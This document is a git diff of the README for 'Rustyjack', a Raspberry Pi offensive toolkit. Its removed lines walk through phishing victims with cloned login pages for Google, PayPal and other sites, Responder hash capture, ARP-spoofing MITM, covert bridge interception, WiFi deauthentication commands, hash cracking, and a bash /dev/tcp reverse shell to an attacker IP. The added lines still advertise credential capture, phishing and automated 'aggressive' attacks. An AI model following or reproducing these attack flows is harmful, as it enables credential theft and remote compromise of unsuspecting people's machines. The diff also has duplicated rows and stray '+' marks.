@@ -41,8 +41,7 @@
 - [Hardware Requirements](#-hardware-requirements)
 - [Installation](#-installation)
 - [Usage](#-usage)
-- [Attack Capabilities](#-attack-capabilities)
-- [Performance](#-performance)
+- [Loot & Data](#-loot--data)
 - [Troubleshooting](#-troubleshooting)
 - [Credits](#-credits)
 
@@ -54,180 +53,51 @@
 
 ### What Makes It Special?
 
-- **🦀 100% Rust** - Complete rewrite from Python for speed and reliability
+- **🦀 100% Rust** - Standalone Rust toolkit
 - **📟 Standalone** - LCD screen, buttons, all tools built-in
-- **⚡ Fast** - 18 second boot, instant response, low power
 - **🔋 Portable** - Pocket-sized, battery-powered option
-- **🛡️ Complete** - Recon, MITM, credential capture, phishing, all included
+- **🛡️ Complete** - Recon, credential capture, phishing, and other integrated tools
 
 ### Architecture
 
+A high-level, current view of the project's structure. Rustyjack is split into two focused components — a compact UI for the on-device display and a separate core that runs orchestration and long-lived tasks.
+
 ```
-┌─────────────────────────────────────────────┐
-│         Rustyjack (Pure Rust)               │
-├─────────────────────────────────────────────┤
-│                                             │
-│  rustyjack-ui          rustyjack-core      │
-│  (LCD/GPIO)            (Orchestration)      │
-│                                             │
-│  • ST7735 driver       • Nmap wrapper       │
-│  • GPIO buttons        • WiFi manager       │
-│  • Menu system         • MITM control       │
-│  • Event loop          • Process manager    │
-│                                             │
-└──────────────┬──────────────────────────────┘
-               │ Launches:
-     ┌─────────┼─────────┬──────────┐
-     │         │         │          │
-  ┌──▼──┐  ┌──▼───┐  ┌──▼────┐  ┌─▼────────┐
-  │nmap │  │arps  │  │tcpd   │  │Responder │
-  │     │  │poof  │  │ump    │  │ (Python) │
-  └─────┘  └──────┘  └───────┘  └──────────┘
-         External Tools
+┌────────────────────────────────────────┐
+│               Rustyjack                │
+├──────────────┬─────────────────────────┤
+│ rustyjack-ui │     rustyjack-core     │
+│ (LCD + GPIO) │     (Orchestration)    │
+│ - Menu / UX  │ - Task runner / CLI    │
+│ - Display    │ - Autopilot & tasks    │
+│ - Button I/O │ - Loot management      │
+│              │ - System actions       │
+└──────────────┴─────────────────────────┘
+
+UI → dispatches commands to → Core → interacts with OS and filesystem
+
+Notes:
+- The UI process (rustyjack-ui) owns the display, button handling and menu presentation.
+- The core process (rustyjack-core) executes longer-running actions, maintains loot, and performs system operations.
 ```
 
 ---
 
 ## ✨ Features
 
-### 🔍 Network Reconnaissance
 
-**12 Nmap Scan Profiles:**
-- **Quick Scan** - Fast TCP scan (~30s)
-- **Full Port** - All 65535 ports (~10min)
-- **Service Scan** - Version detection (~2min)
-- **Vuln Scan** - Vulnerability scripts (~5min)
-- **OS Scan** - Operating system detection (~1min)
-- **Intensive** - Aggressive, all features (~5min)
-- **Stealth SYN** - Evasive SYN scan (~10min)
-- **UDP Scan** - UDP top 100 ports (~5min)
-- **Ping Sweep** - Host discovery (~30s)
-- **Top100** - Most common ports (~1min)
-- **HTTP Enum** - Web service enumeration (~2min)
-- **Custom** - Your own nmap arguments
-
-**Features:**
-- Auto-detect network CIDR
-- Interface selection (eth0, wlan0, wlan1)
-- Results saved to `/root/Rustyjack/loot/Nmap/`
-- Discord webhook integration (auto-upload)
-
-### 🎯 Credential Capture
-
-**Responder (LLMNR/NBT-NS/mDNS Poisoning):**
-- Captures Windows authentication hashes
-- Supports NTLMv1, NTLMv2, Basic Auth
-- Protocols: SMB, HTTP, LDAP, FTP, POP3, IMAP, SMTP
-- Results saved to `/root/Rustyjack/Responder/logs/`
-
-**How it works:**
-1. Listens for broadcast authentication requests
-2. Impersonates requested services
-3. Captures credentials when clients connect
-4. Logs username + NTLM hash for offline cracking
-
-### 🕵️ Man-in-the-Middle
-
-**MITM & Packet Sniffing:**
-- ARP spoofing via `arpspoof`
-- Full packet capture via `tcpdump`
-- IP forwarding for transparent attacks
-- PCAP files saved to `/root/Rustyjack/loot/MITM/`
-
-**Use cases:**
-- Intercept HTTP traffic
-- Capture cleartext passwords
-- Analyze encrypted handshakes
-- Monitor network communications
-
-### 🎣 Phishing (DNS Spoofing)
-
-**26+ Pre-built Phishing Templates:**
-
-| Template | Target Site |
-|----------|-------------|
-| wordpress | WordPress login |
-| google | Google account |
-| facebook | Facebook login |
-| microsoft | Microsoft 365 |
-| twitter | Twitter/X |
-| instagram | Instagram |
-| linkedin | LinkedIn |
-| paypal | PayPal |
-| apple | Apple ID |
-| amazon | Amazon |
-| netflix | Netflix |
-| dropbox | Dropbox |
-| github | GitHub |
-| gitlab | GitLab |
-| office365 | Office 365 |
-| outlook | Outlook webmail |
-| yahoo | Yahoo |
-| steam | Steam |
-| reddit | Reddit |
-| pinterest | Pinterest |
-| tumblr | Tumblr |
-| ebay | eBay |
-| craigslist | Craigslist |
-| airbnb | Airbnb |
-| uber | Uber |
-| custom | Your own HTML/PHP |
-
-**Attack flow:**
-1. Choose template (e.g., "google")
-2. Start DNS spoofing (ettercap)
-3. Start web server (PHP)
-4. Victim visits site → redirected to Rustyjack
-5. Credentials captured to `/root/Rustyjack/DNSSpoof/captures/`
-
-### 📡 WiFi Management
-
-**Features:**
-- Scan for WiFi networks (SSID, signal, encryption)
-- Save WiFi profiles (SSID + password)
-- Auto-connect to saved networks
-- Interface switching (wlan0 ↔ wlan1)
-- Route control (backup/restore/metrics)
-- Dual-dongle support
-
-**Use case:** Use built-in WiFi for internet, USB dongle for attacks.
-
-**Profiles stored:** `/root/Rustyjack/wifi/profiles/*.json`
-
-### 🔄 Reverse Shells
-
-**One-click reverse shell launcher:**
-- Default reverse shell (pre-configured IP/port)
-- Custom reverse shell (enter IP/port on LCD)
-- Uses netcat (`nc`) or bash reverse shell
-
-**Listener setup:**
-```bash
-# On attacker machine:
-nc -lvnp 4444
-```
-
-### 💾 Loot Management
+### 💾 Loot & Data
 
 **On-device loot viewer:**
-- Browse Nmap scan results
-- View Responder captures (hashes)
-- Read DNS spoof captures (credentials)
-- Navigate with LCD buttons
+- Browse captured output and logs (Aircrack and other supported outputs)
+- View device-generated logs and export files
+- Navigate and open files using LCD buttons
 
-**Discord webhook integration:**
-- Automatic upload of Nmap results
-- Manual upload of ZIP archives
-- Formatted embeds with metadata
-- Files up to 25MB
+**Discord integration:**
+- Manual upload of ZIP loot archives via the UI when configured
+- Formatted embeds for notifications and metadata
+- File attachments up to configured size limits
 
-### 🌉 Bridge Mode
-
-**Transparent MITM:**
-- Requires 2 network interfaces (eth0 + eth1 or wlan0 + eth1)
-- Bridge traffic between networks
-- Capture all packets transparently
-- No detection by endpoint devices
 
 ### 🎨 User Interface
 
@@ -259,29 +129,9 @@ nc -lvnp 4444
 
 | Item | Purpose |
 |------|---------|
-| **USB WiFi Dongle** | WiFi attacks (see below) |
 | **Ethernet HAT** | 3 USB + 1 Ethernet (Pi Zero) |
-| **Dual Ethernet HAT** | 2 USB + 2 Ethernet (MITM) |
 | **Battery Pack** | Portable power |
-
-### WiFi Attack Requirements
-
-⚠️ **CRITICAL:** The built-in Raspberry Pi WiFi **CANNOT** do WiFi attacks!
-
-**Why:** Broadcom BCM43430 chipset does not support monitor mode or packet injection.
-
-**Solution:** Use external USB WiFi dongle with compatible chipset.
-
-**Recommended Dongles:**
-
-| Model | Chipset | Monitor Mode | Packet Injection | Notes |
-|-------|---------|--------------|------------------|-------|
-| **Alfa AWUS036ACH** | Realtek RTL8812AU | ✅ | ✅ | Best option, dual-band |
-| **TP-Link TL-WN722N v1** | Atheros AR9271 | ✅ | ✅ | **Must be v1** (v2/v3 don't work!) |
-| **Panda PAU09** | Realtek RTL8812AU | ✅ | ✅ | Good budget option |
-| **Alfa AWUS036NHA** | Atheros AR9271 | ✅ | ✅ | Reliable, widely supported |
-
-**Note:** Always verify chipset before buying! Many sellers ship incompatible versions.
+| **USB Storage / Drive** | Attach external storage for backup or loot export |
 
 ### Pin Configuration
 
@@ -303,6 +153,28 @@ nc -lvnp 4444
 | Key 3 | GPIO 16 | Back button |
 
 **All pins configured in:** `/root/Rustyjack/gui_conf.json`
+
+---
+
+## 🔘 Button controls
+
+The on-HAT buttons and joystick map directly to menu navigation and actions. Below is a concise mapping of logical controls (and the GPIO pins used — see the Pin Configuration table above).
+
+- **Up / Down** (Joystick Up / Down) — Navigate lists and menus.
+- **Left** (Joystick Left) — Back / return to previous menu.
+- **Right** (Joystick Right) — Select / activate highlighted item.
+- **Center press** (Joystick Press) — Confirm / secondary select.
+- **Key 1** (View toggle) — Cycle UI view modes (List / Grid / Carousel).
+- **Key 2** (Reserved) — Reserved for future use / custom mapping.
+- **Key 3** (Back) — Quick back to menu or cancel dialogs.
+
+How these controls behave:
+- Short-press Right or Center confirms selections and triggers actions.
+- Left always behaves as a 'Back' while on dialogs or submenus.
+- Key 1 cycles the display mode to let you change how the menu is rendered.
+
+> Tip: button and view behaviour can be customized by editing `gui_conf.json` (see `config` module in the UI source).
+
 
 ---
 
@@ -371,13 +243,13 @@ chmod +x install_rustyjack.sh
 
 **What it does:**
 - ✅ Installs Rust toolchain (rustup)
-- ✅ Installs system tools (nmap, tcpdump, arpspoof, ettercap, etc.)
+- ✅ Installs optional system tooling as needed by configured features
 - ✅ Enables SPI and I2C in boot configuration
 - ✅ Compiles `rustyjack-core` (orchestration engine)
 - ✅ Compiles `rustyjack-ui` (LCD interface)
 - ✅ Installs binaries to `/usr/local/bin/`
 - ✅ Creates systemd service `rustyjack.service`
-- ✅ Sets up directories (`loot/`, `wifi/profiles/`)
+- ✅ Sets up needed directories (e.g. `loot/`)
 - ✅ Starts service automatically
 
 **Time:** ~10-15 minutes (Rust compilation is CPU-intensive)
@@ -390,7 +262,7 @@ reboot
 
 **6. Verify Installation**
 
-After reboot (wait ~18 seconds), the LCD should display the Rustyjack menu.
+After reboot, the LCD should display the Rustyjack menu.
 
 Check service status via SSH:
 
@@ -427,19 +299,9 @@ journalctl -u rustyjack -f
    systemctl restart rustyjack
    ```
 
-**WiFi Profile Setup:**
+**Network configuration:**
 
-1. On LCD: `WiFi Manager → Scan Networks`
-2. Select your network
-3. If new, enter password via SSH:
-   ```bash
-   rustyjack-core wifi profile save \
-     --ssid "YourNetwork" \
-     --password "YourPassword" \
-     --interface auto \
-     --auto-connect true
-   ```
-4. Reconnect via LCD: `WiFi Manager → Saved Profiles → Connect`
+Configure WiFi and network interfaces using the host OS or your preferred tooling (SSH / NetworkManager / wpa_supplicant).
 
 ### Updating
 
@@ -472,297 +334,56 @@ tar -czf ~/loot_backup_$(date +%Y%m%d).tar.gz loot/
 | **KEY2** | Reserved |
 | **KEY3** | Alternative back button |
 
-### Menu Structure
+### Menu Structure (current)
 
 ```
 Main Menu
 │
-├─ Scan Nmap
-│  ├─ Quick Scan
-│  ├─ Full Port Scan
-│  ├─ Service Scan
-│  ├─ Vuln Scan
-│  ├─ OS Scan
-│  ├─ Intensive Scan
-│  ├─ Stealth SYN
-│  ├─ UDP Scan
-│  ├─ Ping Sweep
-│  ├─ Top100 Scan
-│  ├─ HTTP Enumeration
-│  └─ Custom Nmap
-│
-├─ Reverse Shell
-│  ├─ Default Rev Shell
-│  └─ Custom Rev Shell
-│
-├─ Responder
-│  ├─ Responder ON
-│  └─ Responder OFF
-│
-├─ MITM & Sniff
-│  ├─ Start MITM
-│  └─ Stop MITM
-│
-├─ DNS Spoofing
-│  ├─ Select Site (26+ templates)
-│  ├─ Start DNSSpoofing
-│  └─ Stop DNS&PHP
-│
-├─ Network Info
-│
-├─ WiFi Manager
-│  ├─ FAST WiFi Switcher
-│  ├─ Scan Networks
-│  ├─ Saved Profiles
-│  ├─ Interface Config
-│  ├─ Status Info
-│  └─ Route Control
-│
-├─ Other Features
+├─ Hardware Detect
+├─ Crack Passwords
+├─ View Dashboards
+├─ Autopilot
+│  ├─ Start Standard
++│  ├─ Start Aggressive
++│  ├─ Stop Autopilot
++│  └─ View Status
+├─ Settings
 │  ├─ Options
-│  │  ├─ Colors
-│  │  ├─ Save Config
-│  │  └─ Refresh Config
-│  ├─ System
-│  │  ├─ Restart UI
-│  │  ├─ System Update
-│  │  └─ Shutdown
-│  ├─ Upload Discord
-│  └─ Browse Images
-│
-├─ Read File (Loot Viewer)
-│  ├─ Nmap
-│  ├─ Responder
-│  └─ DNSSpoof
-│
-└─ Bridge Mode
-   ├─ Start Bridge
-   └─ Stop Bridge
+│  └─ System
+├─ Loot
+│  ├─ Transfer to USB
+│  └─ Aircrack
+└─ (Other utilities)
 ```
 
 ### Quick Start Examples
 
-**Run a network scan:**
-1. Navigate: `Main Menu → Scan Nmap → Quick Scan`
-2. Wait for completion (~30s)
-3. View results: `Main Menu → Read File → Nmap`
+Here are a few things you can do from the device's main menu (keeps the current trimmed feature set in mind):
 
-**Capture credentials:**
-1. Navigate: `Main Menu → Responder → Responder ON`
-2. Wait for network traffic
-3. View captures: `Main Menu → Read File → Responder`
-4. Stop when done: `Main Menu → Responder → Responder OFF`
-
-**Launch DNS phishing:**
-1. Navigate: `Main Menu → DNS Spoofing → Select Site`
-2. Choose template (e.g., `google`)
-3. Go back, select: `Start DNSSpoofing`
-4. Victims are redirected to fake page
-5. View captures: `Main Menu → Read File → DNSSpoof`
-6. Stop when done: `Main Menu → DNS Spoofing → Stop DNS&PHP`
+- Run hardware detection: Main Menu → Hardware Detect
+- Start password cracking workflows: Main Menu → Crack Passwords
+- View dashboards for system and attack metrics: Main Menu → View Dashboards
+- Launch Autopilot to run automated sequences: Main Menu → Autopilot → Start ...
+- Browse loot captured from Aircrack tools and transfer to USB: Main Menu → Loot → Transfer to USB
 
 ---
 
-## 🎯 Attack Capabilities
+## ⚙️ Core Capabilities
 
-### 1. Network Reconnaissance (Nmap)
+Rustyjack is now focused on providing a compact UI for the device and a core orchestration process. The following capabilities are maintained in the trimmed-down project:
 
-**Purpose:** Discover hosts, open ports, services, vulnerabilities
+- UI / LCD-driven menu and controls (rustyjack-ui)
+- Hardware detection (interface and peripheral detection)
+- Autopilot — automated sequences and task orchestration
+- Password-cracking workflows (Aircrack-related loot & processing)
+- Loot viewer and transfer utilities (view and export Aircrack outputs)
+- Discord webhook integration for uploading loot and notifications
+- System management (configuration, updates, service control)
 
-**Examples:**
-
-```bash
-# Quick scan (via rustyjack-core CLI):
-rustyjack-core scan run --label "Quick" --nmap-args "-T5 -F"
-
-# Full port scan:
-rustyjack-core scan run --label "Full" --nmap-args "-p-"
-
-# Service version detection:
-rustyjack-core scan run --label "Service" --nmap-args "-sV"
+These components are the primary surface of the current Rustyjack project.
 ```
 
-**Output:** `/root/Rustyjack/loot/Nmap/scan_YYYYMMDD_HHMMSS.txt`
-
-**What you get:**
-- Open ports
-- Running services + versions
-- Operating system guesses
-- Potential vulnerabilities
-
-### 2. Credential Capture (Responder)
-
-**Purpose:** Capture Windows authentication hashes via protocol poisoning
-
-**Protocols targeted:**
-- LLMNR (Link-Local Multicast Name Resolution)
-- NBT-NS (NetBIOS Name Service)
-- mDNS (Multicast DNS)
-
-**Attack scenario:**
-1. User types: `\\fileserver\share` (typo)
-2. Windows broadcasts: "Where is fileserver?"
-3. Responder answers: "I'm fileserver at 192.168.1.100"
-4. User's PC connects and sends credentials
-5. Responder captures: `DOMAIN\username:hash`
-
-**Output:** `/root/Rustyjack/Responder/logs/`
-
-**Files:**
-- `SMB-NTLMv2-192.168.1.50.txt` - Captured hash
-- `Responder-Session.log` - Attack log
-
-**Crack hashes offline:**
-```bash
-# On a powerful machine:
-hashcat -m 5600 captured_hash.txt rockyou.txt
-```
-
-### 3. Man-in-the-Middle (MITM)
-
-**Purpose:** Intercept network traffic between two hosts
-
-**Components:**
-- **ARP Spoofing** - Redirect traffic through Rustyjack
-- **Packet Capture** - Record all traffic
-- **IP Forwarding** - Maintain connectivity
-
-**Attack flow:**
-1. Scan network for hosts
-2. Choose target IP (victim)
-3. Start MITM → Rustyjack spoofs ARP to target + gateway
-4. All victim traffic flows through Rustyjack
-5. tcpdump captures everything to PCAP file
-
-**Output:** `/root/Rustyjack/loot/MITM/*.pcap`
-
-**What you capture:**
-- HTTP requests (URLs, cookies, credentials)
-- FTP credentials (cleartext)
-- Telnet sessions
-- DNS queries
-- TLS handshakes (decrypt later if possible)
-
-**Analyze:**
-```bash
-tcpdump -r capture.pcap -A | grep -i "password"
-# Or open in Wireshark
-```
-
-### 4. DNS Spoofing / Phishing
-
-**Purpose:** Redirect victims to fake login pages
-
-**Attack components:**
-- **ettercap** - DNS spoofing (redirect domain → Rustyjack IP)
-- **PHP server** - Serve fake login page
-- **Phishing template** - Realistic-looking page
-
-**Templates included:**
-- 26+ pre-built templates (Google, Facebook, Microsoft, etc.)
-- Custom template support (add your own HTML/PHP)
-
-**Attack flow:**
-1. Choose template (e.g., `facebook`)
-2. Start DNS spoofing:
-   - ettercap redirects `facebook.com` → Rustyjack IP
-3. Start PHP server:
-   - Serves fake Facebook login page
-4. Victim visits `facebook.com`
-5. DNS redirects to Rustyjack
-6. Victim sees fake page, enters credentials
-7. Credentials saved to file
-
-**Output:** `/root/Rustyjack/DNSSpoof/captures/*.txt`
-
-**Captured data:**
-- Username/email
-- Password (cleartext)
-- IP address
-- User-Agent
-- Timestamp
-
-### 5. WiFi Attacks (Requires USB Dongle)
-
-**Scan networks:**
-```bash
-rustyjack-core wifi scan --interface wlan1
-```
-
-**Output:**
-```json
-{
-  "networks": [
-    {
-      "ssid": "HomeNetwork",
-      "bssid": "AA:BB:CC:DD:EE:FF",
-      "signal_dbm": -45,
-      "channel": 6,
-      "encrypted": true
-    }
-  ]
-}
-```
-
-**Monitor mode (for aircrack-ng):**
-```bash
-# Enable monitor mode on USB dongle:
-sudo ip link set wlan1 down
-sudo iw wlan1 set monitor control
-sudo ip link set wlan1 up
-
-# Verify:
-iwconfig wlan1
-# Should show: Mode:Monitor
-
-# Use aircrack-ng suite:
-airodump-ng wlan1
-aireplay-ng --deauth 10 -a [AP_MAC] wlan1
-```
-
-### 6. Reverse Shell
-
-**Purpose:** Remote command execution on compromised target
-
-**Setup attacker listener:**
-```bash
-# On your laptop/server:
-nc -lvnp 4444
-```
-
-**Launch from Rustyjack:**
-1. Navigate: `Main Menu → Reverse Shell → Custom Rev Shell`
-2. Enter your IP (e.g., `192.168.1.100`)
-3. Enter port (e.g., `4444`)
-4. Connection established
-
-**What happens:**
-```bash
-# Rustyjack executes on target:
-bash -i >& /dev/tcp/YOUR_IP/4444 0>&1
-
-# You get shell on target:
-$ whoami
-victim_user
-$ id
-uid=1000(victim_user) gid=1000(victim_user)
-```
-
-### 7. Bridge Mode
-
-**Purpose:** Transparent MITM between two network segments
-
-**Requirements:**
-- 2 network interfaces (eth0 + eth1, or wlan0 + eth1)
-- Ethernet HAT or USB Ethernet adapter
-
-**Setup:**
-1. Connect eth0 to victim network
-2. Connect eth1 to internet/router
-3. Start Bridge Mode
-4. All traffic captured transparently
-
-**Use case:** Insert Rustyjack between network device and network without detection.
+ 
 
 ---
 
@@ -772,7 +393,7 @@ uid=1000(victim_user) gid=1000(victim_user)
 
 | Device | Rust UI |
 |--------|---------|
-| Raspberry Pi Zero 2 W | ~18 seconds |
+| Raspberry Pi Zero 2 W | (boot time varies) |
 | Raspberry Pi 4 (4GB) | ~8 seconds |
 | Raspberry Pi 5 (8GB) | ~6 seconds |
 
@@ -782,7 +403,6 @@ uid=1000(victim_user) gid=1000(victim_user)
 |-----------|-----|
 | rustyjack-ui (idle) | ~12 MB |
 | rustyjack-core (idle) | ~5 MB |
-| Responder (active) | ~30 MB |
 | **Total (idle)** | **~17 MB** |
 
 ### Response Time
@@ -791,7 +411,8 @@ uid=1000(victim_user) gid=1000(victim_user)
 |--------|------|
 | Button press → LCD update | ~20 ms |
 | Menu navigation | ~30 ms |
-| Scan launch | ~150 ms |
+| Button press → LCD update | ~20 ms |
+| Menu navigation | ~30 ms |
 
 ### Binary Sizes
 
@@ -866,50 +487,11 @@ sudo install target/release/rustyjack-ui /usr/local/bin/
 sudo systemctl restart rustyjack
 ```
 
-### WiFi Attacks Fail
+### Network Issues
 
-**Symptom:** Can't scan networks or capture fails
+If you encounter networking problems, prefer using the host OS to configure interfaces and routing. The UI focuses on presentation and orchestration — network configuration and advanced wireless tooling should be managed via the OS and CLI tools on the device.
 
-**Cause:** Using built-in WiFi (doesn't support monitor mode)
-
-**Fix:** Use compatible USB WiFi dongle (see [Hardware Requirements](#hardware-requirements))
-
-**Verify dongle:**
-```bash
-# List interfaces
-iw dev
-
-# Check monitor mode support
-iw phy | grep -A 10 "Supported interface modes" | grep monitor
-# Should show "* monitor"
-```
-
-### Nmap Not Found
-
-**Fix:**
-```bash
-apt update
-apt install -y nmap
-```
-
-### Responder Not Capturing
-
-**Checks:**
-```bash
-# Responder running?
-ps aux | grep Responder
-
-# Correct interface?
-ip addr show eth0  # or wlan0
-
-# View logs
-tail -f /root/Rustyjack/Responder/logs/Responder-Session.log
-```
-
-**Common issues:**
-- Wrong interface selected
-- No network broadcast traffic
-- Firewall blocking multicast
+<!-- Removed legacy attack feature references -->
 
 ### Out of Disk Space
 
@@ -926,7 +508,7 @@ cd ../rustyjack-ui && cargo clean
 # Archive loot
 tar -czf ~/loot_$(date +%Y%m%d).tar.gz loot/
 rm -rf loot/*
-mkdir -p loot/{Nmap,Responder,DNSSpoof,MITM}
+mkdir -p loot/Aircrack
 ```
 
 ---
@@ -940,11 +522,6 @@ Repository: https://github.com/Iwan-Teague/Rusty-Jack.git
 
 ### External Tools
 
-- **Responder** - Laurent Gaffié ([@lgandx](https://github.com/lgandx/Responder))
-- **nmap** - Gordon Lyon (Fyodor)
-- **dsniff** (arpspoof) - Dug Song
-- **ettercap** - ALoR & NaGA
-- **tcpdump** - The Tcpdump Group
 - **aircrack-ng** - Thomas d'Otreppe
 
 ### Rust Libraries
